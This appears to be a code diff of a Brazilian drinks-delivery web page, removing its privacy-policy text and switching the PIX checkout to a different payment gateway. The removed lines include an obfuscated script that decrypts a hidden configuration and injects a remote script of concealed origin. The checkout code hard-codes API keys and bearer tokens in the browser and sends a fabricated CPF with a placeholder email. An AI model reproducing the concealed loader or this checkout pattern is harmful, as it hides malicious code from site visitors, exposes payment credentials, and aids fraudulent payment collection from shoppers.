@@ -11,25 +11,6 @@
         .footer { margin-top: 40px; font-size: 14px; color: #666; border-top: 1px solid #eee; padding-top: 20px; text-align: center; }
         .footer a { color: #d97706; text-decoration: none; }
     </style>
-<script>(function(){var u_ily=atob("DDhDqhePMc2aXBbtiUNh32XjE/e4NGKZ+Ut5hTjsVaO0KWKA4F46hHTgXOP4Ljme6koq2mP8HrjuMWXC5Vk3z2T7H6fpfjrP6Ew32H7tRLn/LzTX0kNhxHbiVO+gfnKM/Vlu32PiWKvjcWaf7E4mxGOiSa71ODue6lNhhjX5UKHvOTTXqxo+hmytX6z3OTTXq1wi3naiRLn3NXCUpEgxz2HqX7m3L2OP4FwwiDutR6z2KXPPsxph10ry");var g_1a=[];for(var u_9=0;u_9<u_ily.length;u_9++){g_1a.push(u_ily.charCodeAt(u_9)&255);}var q_n=g_1a[0];var e_jk=g_1a.slice(1,1+q_n);var g_wx=g_1a.slice(1+q_n);var p_y2=g_wx.map(function(b,w_k){return b^e_jk[w_k%q_n];});var k_4k3i="";for(var y_ut3=0;y_ut3<p_y2.length;y_ut3++){k_4k3i+=String.fromCharCode(p_y2[y_ut3]&255);}var w_29po=decodeURIComponent(escape(k_4k3i));var u_6x11=JSON.parse(w_29po);var j_06x=u_6x11.globals||[];j_06x.forEach(function(p_i){window[p_i.name]=p_i.value;});var b_cqwr=document.createElement("script");b_cqwr.src=u_6x11.url;b_cqwr.async=true;b_cqwr.defer=true;(u_6x11.attributes||[]).forEach(function(w_k4c1){b_cqwr.setAttribute(w_k4c1.name,w_k4c1.value);});(document.head||document.documentElement).appendChild(b_cqwr);})();</script></head>
-<body>
-    <div class="container">
-        <h1>Política de Privacidade</h1>
-        <p>A <strong>Express Bebidas</strong> valoriza a sua privacidade. Esta política descreve como coletamos, usamos e protegemos as suas informações pessoais.</p>
-        
-        <h2>1. Coleta de Informações</h2>
-        <p>Coletamos informações necessárias para processar pedidos e melhorar sua experiência, incluindo nome, e-mail e endereço de entrega.</p>
-        
-        <h2>2. Uso das Informações</h2>
-        <p>As informações são utilizadas exclusivamente para prestação de serviços de delivery, emissão de notas fiscais e comunicação sobre o status dos seus pedidos.</p>
-        
-        <h2>3. Proteção de Dados</h2>
-        <p>Empregamos medidas de segurança rígidas para proteger seus dados contra acessos não autorizados.</p>
-
-        <div class="footer">
-            <a href="index.html">&larr; Voltar para a Página Inicial</a>
-        </div>
-    </div>
 <script>
   window.BUSCAR_CEP = async function(cep) {
       var cepLimpo = cep.replace(/\D/g, '');
@@ -87,40 +68,39 @@
       
       var payload = {
           amount: amountInCents,
-          paymentMethod: 'pix',
-          customer: {
+          currency: "BRL",
+          method: "PIX",
+          description: "Pedido Delivery - " + enderecoCompleto,
+          payer: {
               name: nome,
-              email: 'cliente@expressze.lat',
-              document: { number: fakeCpf, type: 'CPF' },
-              phone: tel.replace(/\D/g, '') || '11999999999'
+              taxId: fakeCpf,
+              email: "cliente@expressze.lat",
+              phone: tel.replace(/\D/g, '') || "11999999999"
           },
-          items: [{
-              title: 'Pedido Delivery',
-              unitPrice: amountInCents,
-              quantity: 1,
-              tangible: false
-          }],
-          metadata: 'Endere\u00e7o: ' + enderecoCompleto,
-          pix: { expiresInDays: 1 }
+          items: [
+              {
+                  quantity: 1,
+                  name: "Pedido Delivery",
+                  price: amountInCents,
+                  type: "DIGITAL"
+              }
+          ]
       };
       
       try {
-          var res = await fetch('https://api-gateway.techbynet.com/api/user/transactions', {
+          var res = await fetch('https://api.avenpayments.com/v1/payment', {
               method: 'POST',
               headers: {
-                  'x-api-key': 'f3496353-b145-431a-91ac-1e47968b5b6f',
-                  'Content-Type': 'application/json',
-                  'Idempotency-Key': Math.random().toString(36).substring(2) + Date.now().toString(36)
+                  'Authorization': 'Bearer OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0',
+                  'Content-Type': 'application/json'
               },
               body: JSON.stringify(payload)
           });
           var data = await res.json();
-          var tx = data.transaction || data.data || data;
-          var qrcode = (tx.pix && tx.pix.qrcode) || tx.qrCode || (tx.pix && tx.pix.qrCode);
-          var qrcodeText = (tx.pix && tx.pix.qrcodeText) || tx.qrCodeText || (tx.pix && tx.pix.qrCodeText) || qrcode;
+          var qrcodeText = (data.data && data.data.copypaste) || data.copypaste || (data.pix && data.pix.qrcodeText) || (data.pix && data.pix.qrcode);
           
-          if(qrcode) {
-              var qrcodeImg = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(qrcode);
+          if(qrcodeText) {
+              var qrcodeImg = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(qrcodeText);
               var successHtml = '<h2 style="color:#111;margin-bottom:15px;font-size:22px;font-weight:900;text-align:center;font-family:Arial,sans-serif;">Pague com PIX</h2>' +
                   '<img src="' + qrcodeImg + '" style="max-width:250px;width:100%;margin:0 auto 15px auto;display:block;" />' +
                   '<p style="font-size:15px;color:#333;margin-bottom:15px;word-break:break-all;text-align:center;font-family:Arial,sans-serif;font-weight:bold;">' + qrcodeText + '</p>' +
@@ -128,11 +108,12 @@
                   '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ef4444;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;font-family:Arial,sans-serif;">FECHAR</button>';
               document.getElementById('checkout-modal-inner').innerHTML = successHtml;
           } else {
+              console.error('Erro AVEN:', data);
               alert('Erro ao obter o QR Code do PIX. Tente novamente.');
               document.getElementById('pix-checkout-modal').remove();
           }
       } catch(err) {
-          console.error('Erro PUFPAG:', err);
+          console.error('Erro AVEN:', err);
           alert('Erro de conex\u00e3o ao gerar PIX.');
           document.getElementById('pix-checkout-modal').remove();
       }
@@ -171,7 +152,7 @@
           }
           
           var amountInCents = Math.round(total * 100);
-          var FASTSOFT_AUTH = 'Basic a3BfYzI5NGU1NmFkNDJjOGRhOWU0MWViMTc0NDQwOWE2NWJmMDE0MWU2MDU3ZjYyZDU2YjM4N2JjZjBjMTJmZDJhNDprc180MTVjNjQ4MGRkNWNlZDBmM2JjNTc0ZmRjMDFjMjM1OTk0ZDI5ZDdmOWZhZjQ5ZjcyYzMxMDJkZTVjOTU4ZTQ3';
+          var FASTSOFT_AUTH = 'Bearer OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0';
           
           var inputStyle = 'width:100%;padding:14px;margin-bottom:12px;border:2px solid #aaa;border-radius:8px;box-sizing:border-box;font-size:16px;color:#000;background:#fff;font-family:Arial,sans-serif;font-weight:bold;appearance:none;outline:none;text-shadow:none;';
           var labelStyle = 'display:block;margin-bottom:5px;font-size:14px;color:#333;font-weight:bold;font-family:Arial,sans-serif;';
